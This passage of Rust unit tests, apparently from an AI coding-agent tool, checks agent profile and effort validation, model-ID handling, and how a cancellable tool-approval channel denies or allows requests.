            assert!(fixture.store().list().unwrap().is_empty());
        }
        std::fs::write(
            fixture.home.join("agents/unknown-target.md"),
            "---\nname: unknown-target\nmodel: mock/missing\neffort: high\n---\n",
        )
        .unwrap();
        let missing_target =
            fixture.task(json!({"agent":"unknown-target","prompt":"invalid profile target"}));
        assert_eq!(missing_target["ok"], false, "{missing_target}");
        assert_eq!(mock.requests(), before);
        assert!(fixture.store().list().unwrap().is_empty());
        let first = fixture.task(json!({"agent":"Explore","prompt":"valid","effort":"high"}));
        assert_eq!(first["ok"], true, "{first}");
        let agent_id = id(&first);
        let before = mock.requests();
        fixture
            .store()
            .enqueue(agent_id, "do not acknowledge", None)
            .unwrap();
        let response = fixture.task(
            json!({"agent":"Explore","prompt":"invalid resume","resume":agent_id,"effort":false}),
        );
        assert_eq!(response["ok"], false, "{response}");
        assert_eq!(mock.requests(), before);
        let snapshot = fixture.store().load(agent_id).unwrap();
        assert_eq!(snapshot.status, AgentStatus::Completed);
        assert!(snapshot.active_run_id.is_none());
        assert_eq!(snapshot.inbox.len(), 1);
        let mut cfg = crate::config::ProvidersConfig::load(&fixture.home).unwrap();
        cfg.provider[0].models[0].default_effort =
            Some(orbit_adapter::types::EffortValue::Level("invalid".into()));
        std::fs::write(
            fixture.home.join("providers.toml"),
            toml::to_string(&cfg).unwrap(),
        )
        .unwrap();
        let invalid_cfg =
            fixture.task(json!({"agent":"Explore","prompt":"bad config resume","resume":agent_id}));
        assert_eq!(invalid_cfg["ok"], false, "{invalid_cfg}");
        assert_eq!(mock.requests(), before);
        assert_eq!(fixture.store().load(agent_id).unwrap().inbox.len(), 1);
    }

    #[test]
    fn typed_boolean_and_named_false_are_distinct_agent_requests() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        std::fs::write(fixture.home.join("providers.toml"),format!("[[provider]]\nname='mock'\nkind='ollama'\nurl='{}'\n[[provider.models]]\nid='mock-notools'\nsupported_efforts=[false,'false']\n",mock.gate)).unwrap();
        let config = crate::try_engine_turn_config(
            &fixture.home,
            "mock",
            &mock.gate,
            "mock-notools",
            None,
            None,
        )
        .unwrap();
        remember_turn_config(&fixture.cx, &config);
        for (value, expected) in [
            (json!(false), json!(false)),
            (json!("false"), json!("false")),
        ] {
            let before = mock.requests();
            let result =
                fixture.task(json!({"agent":"Explore","prompt":"typed choice","effort":value}));
            assert_eq!(result["ok"], true, "{result}");
            assert_eq!(mock.requests(), before + 1);
            assert_eq!(mock.body()["think"], expected);
        }
    }
    #[test]
    fn slash_model_ids_keep_their_default_and_explicit_effort_on_role_and_profile_paths() {
        let mock = Mock::new();
        let fixture = Fixture::new();
        configure_effort(&mock, &fixture);
        let mut cfg = crate::config::ProvidersConfig::load(&fixture.home).unwrap();
        let mut entry = cfg.provider[0].models[2].clone();
        entry.id = "vendor/reasoner".into();
        cfg.provider[0].models.push(entry);
        cfg.roles.explore = "mock/vendor/reasoner".into();
        cfg.save_atomic(&fixture.home).unwrap();
        let role = fixture.task(json!({"agent":"Explore","prompt":"slash role default"}));
        assert_eq!(role["ok"], true, "{role}");
        assert_eq!(role["result"]["model"], "mock/vendor/reasoner");
        assert_eq!(mock.body()["model"], "vendor/reasoner");
        assert_eq!(mock.body()["reasoning_effort"], "medium");
        std::fs::create_dir_all(fixture.home.join("agents")).unwrap();
        std::fs::write(
            fixture.home.join("agents/slash.md"),
            "---\nname: slash\nmodel: vendor/reasoner\neffort: medium\n---\n",
        )
        .unwrap();
        let profile = fixture
            .task(json!({"agent":"slash","prompt":"slash explicit effort","effort":"medium"}));
        assert_eq!(profile["ok"], true, "{profile}");
        assert_eq!(mock.body()["model"], "vendor/reasoner");
        assert_eq!(mock.body()["reasoning_effort"], "medium");
        let explicit = fixture.task(json!({"agent":"Explore","prompt":"bare slash target","model":"vendor/reasoner","effort":"medium"}));
        assert_eq!(explicit["ok"], true, "{explicit}");
        assert_eq!(mock.body()["model"], "vendor/reasoner");
        assert_eq!(mock.body()["reasoning_effort"], "medium");
        let before = mock.requests();
        let invalid = fixture
            .task(json!({"agent":"slash","prompt":"reject other model choice","effort":"high"}));
        assert_eq!(invalid["ok"], false, "{invalid}");
        assert_eq!(mock.requests(), before);
    }
}

#[cfg(test)]
mod cancellable_approval_tests {
    use super::*;

    fn request() -> ApprovalRequest {
        ApprovalRequest {
            call_id: "plain-approval".into(),
            tool_name: "Bash".into(),
            summary: "run a requested check".into(),
            risk: crate::tools::RiskLevel::Medium,
            preview: Vec::new(),
            grant: Some(GrantOffer {
                rule: "Bash(check *)".into(),
                tool: "Bash".into(),
                pattern: "check *".into(),
                can_save: true,
            }),
        }
    }

    #[test]
    fn pre_cancelled_approval_never_prompts_or_uses_the_auto_tools_bypass() {
        let cancel = orbit_provider_http::CancelToken::new();
        let mut channel = StdApprovalChannel::with_cancel(true, cancel.clone());
        cancel.cancel();
        assert_eq!(channel.ask(&request(), false), ApprovalVerdict::Deny);
        assert_eq!(channel.ask(&request(), true), ApprovalVerdict::Deny);
        assert!(!channel.input_failed());
        assert_eq!(
            StdApprovalChannel::new(false).ask(&request(), true),
            ApprovalVerdict::AllowOnce
        );
    }

    #[test]
    fn cancellation_after_input_refuses_allow_and_saved_rule_answers_without_stale_notes() {
        let cancel = orbit_provider_http::CancelToken::new();
        let mut channel = StdApprovalChannel::with_cancel(true, cancel.clone());
        assert_eq!(
            channel.verdict_for_line(&request(), "n use the smaller check"),
            ApprovalVerdict::Deny
        );
        cancel.cancel();
        for answer in ["y", "s", "a", "n stale note"] {
            assert_eq!(
                channel.verdict_for_line(&request(), answer),
                ApprovalVerdict::Deny
            );
            assert!(channel.take_note().is_none());
        }
        let mut next =
            StdApprovalChannel::with_cancel(true, orbit_provider_http::CancelToken::new());
        assert_eq!(
            next.verdict_for_line(&request(), "y"),
            ApprovalVerdict::AllowOnce
        );
        assert_eq!(
            next.verdict_for_line(&request(), "s"),
            ApprovalVerdict::AllowRuleSession
        );
        assert_eq!(
            next.verdict_for_line(&request(), "a"),
            ApprovalVerdict::AllowRuleAlways
        );
        assert!(!next.input_failed());
    }

    #[test]
    fn an_input_failure_cancels_the_actual_shared_token_and_latches_the_terminal_error() {
        let cancel = orbit_provider_http::CancelToken::new();
        let ordinary = cancel.clone();
        let summary = cancel.clone();
        let mut channel = StdApprovalChannel::with_cancel(true, cancel);
        channel.note = Some("old note".into());
        channel.fail_input();
        assert!(channel.input_failed() && ordinary.is_cancelled() && summary.is_cancelled());
        assert!(channel.take_note().is_none());
        assert_eq!(channel.ask(&request(), true), ApprovalVerdict::Deny);
        assert_eq!(
            channel.verdict_for_line(&request(), "a"),
            ApprovalVerdict::Deny
        );
        assert!(channel.input_failed());
    }
}
